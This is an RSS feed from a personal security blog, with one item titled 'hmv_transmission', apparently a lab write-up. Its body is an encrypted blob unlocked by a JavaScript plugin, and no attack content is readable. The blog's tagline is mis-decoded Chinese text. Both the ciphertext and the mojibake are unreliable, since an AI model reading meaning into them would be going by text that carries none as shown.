<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>TriumphK Blog</title><link>https://7r1UMPHK.github.io</link><description>ÂΩì‰Ω†ÁöÑÊâçÂçé‰∏çË∂≥‰ª•Êª°Ë∂≥‰Ω†ÁöÑÈáéÂøÉÊó∂ÔºåÂ∫îËØ•Èùô‰∏ãÂøÉÊù•Âä™ÂäõÂ≠¶‰π†„ÄÇ</description><copyright>TriumphK Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://7r1umphk.github.io/image/20250716100121947.webp</url><title>avatar</title><link>https://7r1UMPHK.github.io</link></image><lastBuildDate>Fri, 05 Sep 2025 02:23:33 +0000</lastBuildDate><managingEditor>TriumphK Blog</managingEditor><ttl>60</ttl><webMaster>TriumphK Blog</webMaster><item><title>üîíhmv_transmission</title><link>https://7r1UMPHK.github.io/post/%F0%9F%94%92hmv_transmission.html</link><description>&lt;!-- ##{'script':'&lt;script src='https://7r1umphk.github.io/plugins/jiami.js'&gt;&lt;/script&gt;'}## --&gt;
&lt;!--encrypt: 3ea4d927--&gt;
&lt;!--C1NVGg4EERtdGFBDH11LZ0wAH1VUBj1OWRAMFFZhBFVdQxMRFgURGhhdTAUQJ2UzQEhPVQRVXUMTERsMHQ1WH05RUgVBGh8ET0tbV1ZDF18BUFcfAlxMUAoWVAMEEw1GT1FcQxoRHAMZHAJZVBVEEVAZCE1ZTAYyBEMbRRkITgAGTmdMRRNfBgAZGxhRV1YLXUUcGRwNVTIEF18XUBFTelQJV1xBCU5ZRE0ZDFYf5Li45L+Z5oGY5pWE6Zu3UlPkubDjgankvormgZfmlI7pm74LXVlEU3pUGwbkvYfnlJAXTlIaCRVWCkpIFUQRUBtRXwsEXF0GF+aImeaPvuadmeWdnee8oee6tO+9p+WPqeeOiOebluagsOS5ieaci++9r1FfGFUyBEhFFw9JDh8MDhhbVFYBQkhKHAkFX01ZUBccBgUVBAcfGFRWHFZISgMADlRUHwnilb7ilLHilbVFGwkHUeOJh1NWHlhcQCtHBlZMF18VVwZCFxBEQGUy4pSj4pWyFVUeBQwEGFlKR19CFgweSEZUMhYZXDtEVEJGWg4AFgVCBFtcRVtLCAACB0ILR1pKCl0CAFsNFgBVTVBISxgYaHQhESYUAxwOVUxdVBpfHAZQLwZacDIZXB9/UV8LBFxdBgtdQQcITmJXSAblr4Hnm5nmobXkuIrmnY/ovrbooLznqofljojmiZPmj7fvvKILXUFLZ0wYGV0GBFQdVRBNEwQKS0sFEB5QGwoFCQxdFUtfF10ZSlAEClZfBRABWRABHE9V4pS04pS44pS4HxlQGQTjiI8DClRRERopHhgDBEcDX15LGBVJWhUtYuKVv+KUuBwYWR9QBU1dGFsVDg0CQQRVXElaRQkOABlAAUBDQV1YMmtMVgBFHAMXSCVVWUgXRR9MWFBAS1BMTEcBC1pCHgUKSBZXRRURXE0RHEsKCAoCXwFMQEBcSwkKAgJEETIgJGIlVVlIFwFSFANQGg5IV0pDUlcaH1BZUgoWCQFKH0ddRUZaDQsyfx1CAU0ZG0tNSBgfQh9FXUBaXEsYVFYGVBsOCUFFMnZXQ1JCHQIHBlEYDg0CQQJVDhwHGF1cGEMRQVUdHxofSxgQRRdCEBlZYjt3amwXUhFVTSM8Kmx9GGQ3YyMkMy1hCgoXQxFBVU1QBxtdVhgXAUIdZ0hYRExbSBdSERodFQZLGFBMQwI7TV1IWERMW0gXHUEQA1BIA0xMSBoCQxoVCWImeXsYdhZVBwgDG1EYCAANQgFPX0dSKQ4CAHRIdURNWDgoaxhrTgFFEAAEDQhQVlFcXX4HDBMEDhhuUUUGRBQBMgcTGE5RRQZEFAFQJiJ7ETILXVIaCRVWVxdISlJMO0kdTlQYTEpXWRUP56qa5Y6O5Ym25p+4772xBBdLQwBeGwpOVERIBjILB11LZ0wEAgYKChgGUgVXUDs4cBjmnLXlipZOHhkETmJXVFEGD0IeAQ4AUktwbGxnUuacvOWLlO+9pei+oOigpEt2XUBCAWE9PVBZRQEWDhfor4jlnarvvbxRXwQCBjIEWxsPTV1IWERMW0gNUn8aOz4rS+acteWKmQQYHlhLZ3pURE1UBj1OWURNGQxWH+S6tOacteWKluaPkOa1ulJT5Lu844Gp5p2m5YqZ5o6a5rWzC11ZRFN6VBsG6K6H6ZeWF0oBVeeqguWOk+WOueePm+aYlxh2UgpEBj04OEsJFgEZRBHniL3mnYHnm7RIKHVrGOiujeWcqe+8vei+rOaZguadsOaXmOeIo+aclO+8tOaauuacneWOo+eOgeWOmuWJhOeVmOa9p+a1teOAugQXR0w7SR1OUFsACBjnq5jljpHov6HooLlNPgc9dnsY5py65YuT77y95Y6a5LqI6YGq6L6v5rSk6Kew5ZmQ6L+m5o6S5YmC5Lix5LmfTTQHCFNdShflr4vlmZnnm7FNJiYoGOahtOmdmueOmOWjseOAs0lCAFZhBFAJFxtVSErkubnlhJvplYXkv5nmgZfojo/lj6FVD+S5vOOBrOWEg+mVhuS+iuaBl+iOj+WPrgtdWURTelQbBuWckBhhPHJV54+C5aOz55us5qGS55uW5b2t5Liz5Y+m54+C5Lix5Lmf5ZGg5LmKSFdbV1xSTEIQDgINHwQXW1gWVEtN55u05pev5Lqd77y05Ya95a6B5LiNUnMHDBkGDU1bUxforp/oqLHnvaPlh7Tnm7TkuovnoarjgLrnlInkurYXPF4jIzNI54+E5aK755q85aS15YiB57Oq6LSF5Yuq6IKQ5ayo5Z2A6Zi75YiO77y06Zy46Ka254iL5q675peM5rK45pyV5aWs55Gt6L+h5LiS5pa/5LuB44GwDVodTmJXWlRXVBlAAAIEDVUESAZsU2UcHS1UREgGMgsCD0kMUAAZXV4FEBpFAR0DUkQXX1FDGkQXQxMHBhdZVFIFAEFdXxsfTUhRU19/Gjs+K0ZbV0hOX0EUHgQNRExKXVJdXBQEHk9LTFlKUBdFSEovCgdZVlMQUlIZDAMbVh9NSltVDx0ZBBgYAhcXUBtFHRgSRghXVRdWHlQCXERYREtMTUcbVVgjHz4lexVbWAJIWB0RGx9dF0xFF1RaABEBBQQXWQlOHgVTelQbBuaIqeeUkOS4uuS7tO+8veaJpOWOhhEB5pWS5Lq+5Li45LizC11BS2dMRwlUV1tcA0QaGRVWYQRQChcbVUhKQ1lGVldOWREc5aW45Ymb57Oo6LWc6KaI5YaL5paB5qGwEEwCW1xQJgRudnsX5aW/5YiH57Ot6LWZ6KaT5Yeb5peS5qGwBBdfQA9/UQBW5LyU55SQ5L+W5pSB6L+w55u2ET8MBgk4W0pRRwYR6IWv5p2B5pyV6KaL5YeYGHZXYTxyVeebqeWlveWJnuezs+i0jOmXlumioO+8rU4eBVN6VBtKXQYLEV4RCFALB1lLSwpVXRQDFx0KX10VXRNHFB4TGgJITB8XHlAbCk1PAVlOWUQRQxwdBE9VW1RZRAERIyMzOApLTF0XCTtVTVBICFdWS0MARBYZHxpDW1dWURtWVVBQExYRGEM9UhFVTVBISxhMUF4BHxYCHg4CXxgFFwk7VU1QSEsYGBgXUhFVHhUEDltMV0VIEVNOQ1FQG1ZXYTxyKg4RBh1ZSx4UQQhOQXpISxgYGBdSEVVNUEgNWVRUVRNSHj4VBA5bTFdFSBFTTkNRUFtZVkETQlNOQ1FQFDIYF1IRVU1QSEsYGBhVE0IQKRUECkECGA9CHX9NUEhLGBgYF1IRVU0DGA5bUVlbNlQZDAlSSwkOCBt4EVVNUEhLGBgYF1IREAMRCgdddFdQFVgbCkpIH0pNXRt4EVVNUEhLGBgYF1IRGAQUDAdde1ReEVowAxEKB11cAhcGQwAIXGJLGBgYF1IRVU1QSEsWFhZUHV8TBBdiSxgYGBdSEVUQS2JLGBgYF1IRVRkYARgWW1lZBFAGTU1IBU1UVAx4EVVNUEhLGBhMXxtCWwQDIQVRTFFWHlgPCBRIVhheWVsBVE5nUEhLGBgYF1JSGgMDHEtLUFFRBmEUBAIbSwUYQz1SEVVNUEhLGBgYF1IXVl5JUxUeGwsOSQtVS1NbUgNYHhRBCE5BUE5ICwEDFlQSRlRLUkseGwsOSQBTTkNRUBQYHhRBCE4tVktYAQMCF1QSRlRLWk0bCwEMXhFTTkNRUBseGwRLCk9NVktYAQMLEVECTFZcSE0bCwEMVhdWXklTURgeGwRLCkFLU1tSAxQyF1IRVU1QSEsYGBgXVBJGVEtNTRsLAQxIEVNOQ1FQDR4bBEsKWU1WS1gBA2YRUQJMVkpITRsLAQxEF1ZeSVNHGB4bBEsKUwwdGFAeGwsOSQtVS1NbUgMPHhRBCE5BUE5ICwEDHVQSRlRLUkseGwsOSQlTTkNRUBQYHhRBCE5FVktYAQMCF1QSRlRLUU0bCwEMXjtVTVBISxgYGBdSEVVLU1tSAxEeFEEITldQTkgLAQMHVBJGVEtESx4bCw5JblNOQ1FQAhgeFEEITkBWS1gBAxQXVBJGVEtDTRsLAQxIEVNOQ1FQBR4bBEsKWU1WS1gBA0MRUQJMVkpITRsLAQwpF1ZeSVNHGB4bBEsKCEtTW1IDAhgRUQJMVi1OSAsBAxt4EVVNUEhLGBgYF1IRU05DUVBEHhsESwpPTVZLWAEDZGtUEkZUS0RLHhsLDkkLU05DUVACGB4UQQhOVlZLWAEDFBdUEkZUS04aTVdMDFQSRlRLUkseSU1YBgpTTkNRUB5JTVgGCllNVktYAQMeWwYKU05DUVACGB4UQQhOQVZLWAEDFBdUEkZUS04MTAMeFEEITldQTkgLAQMZVBJGVEtEYRgYGBdSEVVNUEhLGB4bBEsKSktTW1IDAhgRUQJMVl9OSAsBAz1SEVVNUEhLGEUDPVIRVU1QSEsYTFBeAR8GHRULAllUc1ILQlVQUAYOTxh1VgIZf01QSEsYGBgXUhFVTT8KAV1bTBkXXwEfGQ0YEEtQXhRFJQwZGhgRFlVWAhldNgMRBhQYWlYBVChEUFVNX0wDFylCDABcSBAYU11OSBEXDAMNRxhLUF4URT4ICVJLTEpNUlJMKER6SEsYGBgXUhFcVnpISxgYRT1SEVVNHAcMEBYWGRNDEh5ZSBAYUV4XWkUdBANGCFdWXl4VHxADEQoHXXRXUBVYGwpZSAhXVktYHlRbAR8PQx4bCw5JaiMjMzgKS0xdalQSRlRLREsWFhZWAFYGREtIFjIYGBdSVAcfHxpDFhYWVgBWBkRQE0tbV1ZEHV0QQxUaGVdKEBFRAkxWKz4le2hZRAZUKEtTW1IDFBgZXB8UHxcbQgMYRT1SEVVNFgEFXHtZWQRQBkVZSBAyGBgXUhFVTVAcA1FLFlQTXwMMA0hWGFxXVAdcEAMERhpNXUpOIVQZCBMcBEoQTF8bQlsOHwYNUV8WRBddEA4EBxkRGERLeBFVTVBISxgYGBdSEVVNUEhLGBgYF1JVGg4FBQ5WTBZGB1QHFCMNB11bTFgAGQEFGRtFW1dWURtWWwsRBAdaWVtcIVQZCBMcBEoRAz1SEVVNUEhLGFFeF1oQAQUZG0VbWVZBE0JcTQQAGVdPGFkXRlUoAhoEShAeFEEITi4RBh1ZSxhZHUVVCx8dBVweGwRLClxWekhLGBgYF1IRBwgEHRlWGExfG0JbDhEGHVlLAz1SEVVNDWJLGBgYVABUFBkVIw5BWldWAFUwGxUGHxBMQUcXHVUGFRFHGFdIQxteGx5QVUtDRREXCTtVTVBISxgYGEUXRQAfHkgFXU8YfBdIFwIRGg99Tl1ZBhkBFAANRxhDMhdSEVVNUEhLGBgYFxlUDEF6SEsYGBgXUhFVTVBIAF1Be1gWVE9NGw0SFltQVgByGgkVKR8QCBEbeBFVTVBISxgYGBdSERYFERooV1xdDVJaEBReCwNZSntYFlQ0GVhYQhQyGBdSEVVNUEhLGBgYQBpYFgVKSABdQRZUGlAHLh8MDnlMEAdbHX9NUEhLGBgYF1IRVU0SHQlaVF1ESBEBHwUNRzIYGBdSEVVNUEhLGBgWGVxeBRkZBwVLMhgXUhFVTVBIFhEDMhdSEVUQekhLGBhZRAtfFk0DDQVcc11OEF4UHxQtHV1WTERaUh0MAkFLQzIYF1IRVU1QSAhXVktDUlwUHQABBV8YBRcGWRweXhsbXVtRVh56EBQDRgxdTBBUGlAHREtiSxgYGBdSEVUBFRxLU11BfhxXGk1NSAZZSEheHFZVZ1BISxgYGBdSEVVNUFdLVVlIRxtfEk16SEsYGBgXUhFVTVBIURgXY3ZfayhCXhwOS0wQVBpQB0RQV0tDGFNSCwtVDhgJGRQYS18bVwEmFRFRGExKQhcRCE1KSBAYU11OSBEWBREaRxhLUF4URT4ICVJLXllURBcRCFZ6SEsYGBgXUhEWAh4bHxhcXVsTSFVQUAUKSEhRWRURSk0EAAJLFltYHFccCl4bG11bUVYedRABERFLAhhMXxtCWw4fBg1RXxZVE0IQKRUECkEDMhdSEVVNUEhLXldKF1pSGgMDHEtdThhYFBEuS1NbUgNTXU4WXgIDVktYAQMUF1QSRlRLAw5BSEpSAUJTTkNRUBQYHhRBCE4GFREeSB4bBEsKKERQE2EYGBgXUhFVTVBISxhZT1YbRVUDFR9LaEpXWhtCEEUCDRgYBR5QBgpVFnpISxgYGBdSEVVNUEhLGBgYRBdFIQQdDQRNTBAfWxFISxccUBhDMhdSEVVNUEhLGBgYF1IRVU1QSEsYTFBeAR8WDB4eCksWXF4BQRQZEwAuTl1WQ1o7VU1QSEsYGBgXUhFVTVBISxgYGBdSEVVNBAACSxZbRRdQAQg7DRJaV1lFFnQDCB4cQ11OFBcRWRQfXEgQGEtQXhRFPggJUktTXUF+HFcaQwMAAl5Mc1ILEQhEekhLGBgYF1IRVU1QSEsYGBgXUhFVREtiSxgYGBdSEVVNUEhLGBgYF1IRVU0EAAJLFlRYFRkV5Y686YGxSE9DXU5KSBFTTkNRUBxDW18TQwhLU1tSAxgQRBpYExlNTBBTXUF+HFcaQwMAAl5Mc1ILTFwNWVNhGBgYF1IRVU1QSEsYGBgXUhFVTVAaDksQEQx4EVVNUEhLGBgYF1IRVU1QSBYUGAkHWwp/TVBISxgYGBdSEVVNDUFQMhgYF1IRVU1QFWEYGBgXUhFVTREfClFMGFkXRlU9AgcGUUtdHwBUBk1NTgxMAxhEF0UhBB0NBE1MEEUXQllNFA0HWUERHkk7VU1QSBYyGBgXUlAGFB4LS0tdVlMhRQcEHg9DTF1AQ1sRDmdQSEsYGBgXUlgTTVhJH1BRSxkRUBsbERtCGEpdQwdDG00EAAJLFl1FAF4HRVZLWAEDe1YcRxQeUAYETBhRWRtFHAwcARFdXB4UQQhOREtiSxgYGBdSEVUZGAEYFltZWQRQBkMWBwhNSxAeSTtVTVBISxgYGFYFUBwZUAYOTxhoRR1cHB4VQBldSxgKVFYBVlAbDkxsUVoXXgAZWBoOSxQYBUIBXERLYksYGBgXUhFVCx8aSxBUXUNSWFVQUFhQGFEYER5FTk0EDRNMFlRSHFYBBUtIAhMTERcJO1VNUEhLGBgYF1IRVRkCEUtDGFlAE1gBTQQAAksWS1IcVT4ICQoEWUpccgRUGxkDQB9dQExsG2xcVlAVYRgYGBdSEVVNUEhLGFtZQxFZVUUVQUtDGExfG0JbCAIaBEoQWOWtoOetlBFTTkNRUBxDTFIKRS4ELRVNGwsBDFLlh4vplaxXEERLXREDFw87VU1QSEsYGBhKeBFVTVBISxgYTF8bQlsBHw9DHklNWAYK5Y6k6YGs5a+85q69TUlNV0NJGE5nUEhLGEUyF1IRVQwDEQVbGEtfHUY2GAMcBFVxVkcHRTcCCEBCGEMyF1IRVU1QSEtKXUxCAF9VAxUfS2hKV1obQhBFAg0YV1ROUlIMUwoEU0tDMhgXUhFVTVBISxgYGFsXRVUCBg0ZVFlBF08REQITHQZdVkwZEUMQDAQNLlRdVVIcRV1LU1tSA1xRQVQSRlRLQVAyGBgXUhFVTVBISxgYd1UYVBYZXgkYS1FfWVpeAwgCBApBFktDC10QQVATYRgYGBdSEVVNUEhLGBgYF1JBGh4ZHAJXVgIXVBJGVEsOAkBdXBFRAkxWXEgfV0gCF0IdVQEVDh8CGAgbUkYcCQQAURgeGwRLCkRdQE1NGwsBDF4RHQgZDwNMAhgRUQJMVkFYWx0eGwRLCllnUEhLGBgYF1IRVU1QSEsYGFpWEVoSHx8dBVwCGBFRAkxWAg8JWRAIG0IdRUFARl0RHhsESwpZTRQBGEhUWU5IEVNOQ1FQXlRdT1QSRlRLRGEYGBgXUhFVTVBISxgYGBdSUBkEFwYiTF1VREgRU05DUVBbXVZDF0NTTkNRUBQYUkIBRRwLCSsEVkxdWQYLVUtTW1IDW11ZBlQHS1NbUgMUGE07XxEICFJLAQEBDngRVU1QSEsYGBgXUhEIREtiSxgYGBdSEVVNUEhLVF1MFxBeDU1NSA9XW01aF18BQxMaDllMXXIeVBgIHhxDHhsLDklVHBtWS1gBAxEMeBFVTVBISxgYGBdSEToPGg0ITBZZRAFYEgNYCgRAFktDC10QQVATYRgYGBdSEVVNUEhLGBgYF1JTFA4bDxlXTVZTSBFTTkNRUBteXlFUEkZUS0RLSFlcUxtfEldQTkgLAQMFQkENS1NbUgMUGFUdQxEIAjoKXFFNREgRU05DUVAASEARUQJMVlxiSxgYGBdSEVVNUEhLGBgYFxZYBh0cCRICGB4UQQhOCxwNEx4bCw5JHVULHA0TfFFKUhFFHAIeUkseGwsOSVIaAQUFBR4bCw5JHVUAGQY8UVxMX0gRU05DUVALCAhHChdWXklTYRgYGBdSEVVNUEhLGEURDHgRVU1QSEsYGBgXUhEZCARIH11ATFYAVBRNTUgPV1tNWhdfAUMTGg5ZTF1yHlQYCB4cQx4bCw5JRRAVBAkZXVkeFEEITkRLYksYGBgXUhFVTVBIS0xdQEMTQxAMXhoET0sYClIFTk0EDRNMWUpSEx8GGQkEDhZPUVMGWVVQUE5ICwEDBkIBUEtTW1IDAzIXUhFVTVBISxgYGBcGVA0ZERoOWRZIWxNSEAUfBA9dShgKUhdWXklT57Oz6LSM6Ka55Y+p6YC255u25Ya05a+MQ15GTRsLAQxJO1VNUEhLGBgYF1IRVQEVHEtaTFYXTxERAhMdBl1WTBkRQxAMBA0uVF1VUhxFXUtTW1IDWk1DBl4bS1NbUgMRAz1SEVVNUEhLGBgYF1JTAQNeHA5ATHtYHEUQAwRIVhgeGwRLCuWOpOmBrFZLWAEDAxcQRRtDAxwSVF0WWhNDEgQePARIGAUXVBJGVEtZW0hAHhRBCE5WekhLGBgYF1IRVU1QSAlMVhZYHFIZBBMDSwUYEB5SDFMKBFNLQxhcWBFEGAgeHEVaV1xOXEMQAB8eDntQUVsWGRobFRoHWUERDFJDEB4fBB1dEExSCkUUHxUJRU5ZVEIXGE5NDVNhGBgYF1IRVU1QSEsYWldPXFAFHRUGD3tQUVsWGQEICBwKSl1ZHkkRFwIIRgpISF1ZFnIdBBwMQ1pMVh5JERobFRoHWUEWVgJBEAMUKwNRVFwfEF4NREtiSxgYGBdSEVVNUEhLXFdbQh9UGxleCgRcQRZWAkEQAxQrA1FUXB8dRxAfHAkSEQMYQxdJAQwCDQoWXldUB0JdREtiSxgYGBdSEVUQWVNhGBgYFw87VU1QSApLQVZUUlkUAxQEDnVRXFMeVDYBGQsAEF0RFwk7VU1QSEsYGBheFBFdCF4KHkxMV1lSDEhQUFlLHllVR0kXFAAAU0tMUFFEXFIaAxYBDBZVUVMWXRAuHAEIU31WVhBdEAlZSBAyGBgXUhFVTVBISxgYXRkCQxAbFQYffF1eVgddAUVZU2EYGBgXUhFVTVBISxhMUF4BHxYMHh4KSxZeWBFEBkVZU2EYGBgXUhFVTVBISxhUXUNSRRAVBEhWGFlPVhtFVRkYARgWS1BYBXIAHgQHBnFWSEIGcxoVWEFQMhgYF1IRVU1QSEsYGFFRUhkBCAgcQhhZT1YbRVUZGAEYFktdWRZiAR8ZBgwQTF1PBhhOZ1BISxgYGBdSTH9NUEhLRTIYF1IRHAMZHEMRGEM9UhFVTVBISxhRXhdaRR0EA0YCS3FWXgZYFAEZEg5cERhFF0UAHx5IH1BRSxkXQwcCAkBNGwsBDDNdBwgRDBIYUVZeBlgUARkSDlweGwRLClxWekhLGBgYF1IRAQUZG0VeUVZTMVAbGxEbQxEDMhdSEVVNUEhLTFBRRFxSFAMGCRgWWVxTN0cQAwQkAktMXVkXQ11LU1tSA1VXQgFUAB1WS1gBAxQXBlkcHl4AClZcVFI/WBEJHA0oVFFbXFxTHAMUQB9QUUseWwp/TVBISxgYGBcGWRweXgsKVk5ZRFxQEQk1Hg5WTHReAUUQAxUaQx4bCw5JUhoDBA0TTFVdWQcXVl5JU0cYXRgKVFYBVlANRUhKXUEXXwEpFQ4KTVRMH1sYTmdQSEsYGBgXUkYcAxQHHBZLXVkWYgEfGQYMGAUYQxpYBkMDDQVca0xFG18SQxIBBVwQTF8bQlxWekhLGBgYF1IRAQUZG0VRS3FZG0UcDBwBEV1cGApSRQcYFVNhGBgYF1IRVU0EAAJLFlRYFRlTTkNRUG52e2cTQgEIUOS5hemVheinnuWPqeeJsOW3heWJr+WnuuWNo0tTW1IDEQM9UhFVTQ1iSxgYGFMXQgEfHxFDERhDPVIRVU1QSEsYUV4XWhABBRkbRVFLcVkbRRwMHAERXVwRFwBUARgCBlAyGBgXUhFVTVAcA1FLFlQTXwMMA0YZXVVXQRd0AwgeHCdRS0xSHFQHRVZLWAEDVVgHQhAYAE5ICwEDG1JFHQQDRgNZVlxbF3wcCRQEDntUUVQZHxcEHgxDTFBRRFsYTmdQSEsYGBgXUlUQARUcDhhPUVkWXgJDAw0FXGtMRRtfElZ6SEsYGBgXUhEBBRkbRVFLcVkbRRwMHAERXVwYClJXFAEDDVAyGBgXUhFVTVAcA1FLFlsdVl1LU1tSA+mUuOavueWuu+aJohdWXklTQgMyGBdSEQhnDWIIV1ZLQ1JHGw4gCRhMXRgKUl8QGlA+JXtoWUQGVF1ES2IdVltoVgFFEEMZBgJMEBEMeA1aDh8MDgYEF0cAVEtnTBhV5LiV6ZSW6Kee5Y+m77265o6W5YmD5Y6d6L+j5YSN5YuL6L2F77yxBBgCD39RGFpLUVwFEEEDWA8CCQJWXk1UGRzoppbphqflmJhPVQsWChcwQxQEHg4eW1MY6KeU6Ya45ZmZSUIYWlUyBEgJ5Ymp5buLVT0JHANXVhjohK3mnZ7op5Lmn6VNMhoKUVZeQhFaVeS6juehse+9slcXSAY9TkEHCE5UCFdcXRcRXRQeA1VMVFlWUAdQEghdGBJMUFdZVREZDB4PVh9IQUMaXhtKTgsPGDJbVgYRUwoEU0taXhZHCxFTAQRTTVRMAxdUEkZUSy0kfh4bBEsKf05RRx5LShdVG19aCB4eS0hBTF8dX0ZnEwQKS0sYdRR4GxkVGhtKXUxSAAt/TVBIS1xdXhctbhwDGRw0ZxBLUh5XXFd6SEsYGBgXUhEGCBwORVVdVRdPES5dLUhBGAsIB0IBf01QSEsYGBgXAVQZC14YH0oYBRdCO1VNUEhLGBgYRBddE0MTBw9dZ0hDABFITUBiSxgYGBdSEVUeFQQNFlFWRwdFKg8FDksFGGNqeBFVTVBISxgYS1IeV1sCBRwbTUxnVQdXVVBQMzYyGBgXUhFVTVBiSxgYGFMXV1UfBQZDS11UUV4RFgIUDUcYUVZHB0UqCREcCgUeSUIdRU5LAR0ETAMRDXgRVU1QSEsYGEtSHldbHxUbDkwQET1SEVVNUEhLGEtdWxQfHAMAHR9nWk1RUgxVARkbHxBRVkcHRSoJERwKFl1WVB1VEEVZQWEYGBgXUhFVTRMHD10YBRdUEkZUS05ICwEDGRheHANYC0teV0oXEREcA1ALBFxdGF4UERZNGQZLHhsLDkkXEhlLTgdMAxMaXB0uMFZLWAEDET1SEVVNUEhLGEtdWxQfFgIUDUsFGFtYFlR/TVBISxgYGBd4EVVNUEhLGBhPXxtdEE0DDQdeFltYFlQqHQQaSx5UTAxSXRADWAsEXF0RDXgRVU1QSEsYGBgXUhEWABRIVhhbV1MXagYIHA5FW1dcUi1BAR8tYksYGBgXUhFVTVBISzIYGBdSEVVNUEhLGBhRUVJSGAlQVVYYHhsESwpTCgRTTRsLAQxIO1VNUEhLGBgYF1IRVU1QSEtLXVRRXEEBH1BVSxBLXVsUHwUZAkhAGAkRF1cRRl1AWFsyGBgXUhFVTVBISxgYXVsbV1UOHQxLBQUYEVECTFZWBB8DHhsESwpPZ1BISxgYGBdSEVVNUEhLGBhLUh5XWx0EGksFGBBEF10TQwAcGRgVGAZbEVBNQ1hbCAgyF1IRVU1QSEsYGBgXF10cC1ALBlwYBQpSF1ZeSVNAHhsLDkkLf01QSEsYGBgXUhFVTVBISxhLXVsUHxgIHTMYXVReGQJFBzBQVUsQS11bFB8YCB0zGF1UXhkCRQcwUENLCREYElIDQFt6SEsYGBgXUhFVTVBIDlRRXhcRXBFNTVVLHhsLDkkcU05DUVACMhgXUhFVTVBISxgYGBdSEVUeFQQNFlVdWilCEAEWRhtMSmUXTxFdHhUEDRZVXVopQhABFkYbTEplF18RRERQTUsKDQ49UhFVTVBISxgYGBdSVBkEFkgIVVwYCk8RU05DUVAWHhsESwpPZ1BISxgYGBdSEVVNUEhLGBhLUh5XWwIFHBtNTGdVB1dbDAAYDlZcEFQaQ10eFQQNFlVdWilCEAEWRhtMSmUeWztVTVBISxgYGBdSEVUIHAENGFtVU1IMSE1WS1gBAxQRUQJMVkpiSxgYGBdSEVVNUEhLGBgYFxtXVR4VBA0WUVZHB0UqDwUOUTIYGBdSEVVNUEhLGBgYF1IRVU1QSBhdVF4ZH1QYNgMNB14WSEMAbFVQUBsOVF4WXhxBABkvCh5eFkhYAhlFRHpISxgYGBdSEVVNUEhLGBgYUh5CEFd6SEsYGBgXUhFVTVBISxgYGBdSEVUeFQQNFlVdWilCEAEWRhtMSmUXTxFFZ1BISxgYGBdSEVVNUA0HUV4YVB9VVVBNSE0bCwEMKRdWXklTUTIYGBdSEVVNUEhLGBgYF1IRHAtQGw5UXhZaF1wuHhUEDRZITEUvEUhQUFhRMhgYF1IRVU1QSEsYGBgXUhFVTVBIGF1UXhkYRBgdLw4ESk9ZRRYZXGdQSEsYGBgXUhFVTVANB1FeGFQfVVVQTUhNGwsBDC8XVl5JU1EyGBgXUhFVTVBISxgYGBdSERwLUBsOVF4WWhdcLh4VBA0WSExFLxFUUFBYUTIYGBdSEVVNUEhLGBgYF1IRVU1QSBhdVF4ZGEQYHS8KCltTT1YAVV1EekhLGBgYF1IRVU1QSEsYGBgXUhFVZ1BISxgYGBdSEVVNUBsOVF4WVB1VEDIAHBkYEwUXQztVTVBISxgYGBdSEVVnUEhLGBgYF1JDEBkFGgUYHhsESwpTTkNRUBZSV14cGQYIHA5FV01MRwdFKg8FDkIyGBgXUjtVTVBID11eGF0HXAUyFgcZT1lKU1pCEAEWQVEyGBgXUhFVTVAKGVlbU1IGbhYCBQYfGAUYBngRVU1QSEsYGE9fG10QTRIaCltTXUMtUhoYHhxLHl9MDFIBVQweDEtLXVRRXFIaCRU3G0xKGBEeRU5NHA0FEEtdWxQfFgIUDUIYFRgGSDtVTVBISxgYGBdSEVUeFQQNFltXUxduBRkCSEAFGAk9UhFVTVBISxgYGBdSWBNNAw0HXhZbWBZULh4VBA0WW1dTF24FGQI1SwUFGBFRAkxWK05ICwEDDXgRVU1QSEsYGBgXUhFVTVBICUpZW1wXRSoOHx0FTBgTClIAf01QSEsYGBgXUhFVTRUEAl4YS1IeV1sOHwwOY0tdWxQfFgIUDTRITEpqUgxITVZLWAEDZRFRAkxWSmJLGBgYF1IRVU1QSEsYGBgXEEMUDhsNH2dbV0IcRVVATUhaMhgYF1I7VU1QSA9dXhhdB1wFMhIJCFNPWUUWGQYIHA5CAjIYF1IRVU1QSAlKWVtcF0UqDh8dBUwYBRdDO1VNUEhLGBgYQBpYGQhQChlZW1NSBm4WAgUGHxgeX0NJEUVNEQYPGEtdWxQfFgIUDTRITEoXVFYBVlBYUTIYGBdSEVVNUEhLGBhLUh5XWw4fDA5nSExFUhxITUFiSxgYGBdSEVVNUEhLUV4YRBddE0MTBw9dY0tSHldbDh8MDmdITEUvEUhQUE5ICwEDalQSRlRLUmEYGBgXUhFVTVBISxgYGBdSUwcMEwMOTGdbWAdfAU1bVUsJMhgXUhFVTVBISxgYGFIeWBNNAw0HXhZbWBZULh4VBA0WW1dTF24FGQI1SwUFGBFRAkxWK05ICwEDDXgRVU1QSEsYGBgXUhFVTVBICUpZW1wXRSoOHx0FTBgVClIAf01QSEsyGBgXUlUQC1AaDktdTB8BVBkLWVJhGBgYF1IRVU0DDQdeFlVSHxFITStYNhgSGARCAUVdekhLGBgYF1IRBggcDkVITEoXTxFFZ1BISxgYGBdSQhABFkYIV1xdaAJFB01NSFsyGBgXUhFVTVAbDlReFlgHRQUYBDcJTV4YClJqKGcZDktnZ1ZWH1QqMlBVVhgeSUIdRU4yLwUKUVZnaFRAAAIEU1EyGBgXUlMTTU1IKV5xVkMXQwUfFRwOShARPVIRVU16SEsYGExFCwt/TVBISxgYGBcFWAEFUAcbXVYQEVECTFZfGw5bSl1DVBJGVEtESx4bCw5JQ1NOQ1FQERhZRFJXT2dQSEsYGBgXUhFVTVALBFxdGApSV1sfFQkPEBEyF1IRVU1QSEtKXUtCHkVVUFAKDRZKTVlaUhoJFUFhGBgYF1IRVU0AGgJWTBBFF0IAAQRBYRgYGBcXSRYIABxRMhgYF1IRVU1QGBlRVkwfVEAAAgRTIlZMXUUTUgEEBg1LVVdcUkgXBBgfHFARMhgXUhFVTVBIHFBRVFJSZQcYFVJhGBgYF1IRVU1QSEsYTEpOSDtVTVBISxgYGBdSEVVNUEhLW1dcUlIMVQQeGB5MEB5GB14BVjIuTV9MAxdUQAACBFNCMhgYF1IRVU1QSEsYGBgXUhEcC1ALBFxdGApPEVNOQ1FQSU1RQ1QSRlRLUmEYGBgXUhFVTVBISxgYGBdSEVVNUAoZXVlTPVIRVU1QSEsYGBgXUhFVTVAaDktNVENSDFUPFkYZTVYQVB1VEER6SEsYGBgXUhFVTVBISxgYGF4UE